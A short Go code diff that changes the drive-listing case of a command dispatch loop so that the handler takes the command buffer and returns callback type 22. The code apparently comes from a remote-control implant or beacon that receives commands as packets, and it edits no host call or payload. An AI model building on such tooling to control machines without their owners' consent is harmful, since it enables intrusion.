@@ -137,8 +137,8 @@ func main() {
 								result, err = services.CmdMkdir(cmdBuf)
 								callbackType = 0
 							case packet.CMD_TYPE_DRIVES:
-								result, err = services.CmdDrives()
-								callbackType = 0
+								result, err = services.CmdDrives(cmdBuf)
+								callbackType = 22
 							case packet.CMD_TYPE_RM:
 								result, err = services.CmdRm(cmdBuf)
 								callbackType = 0
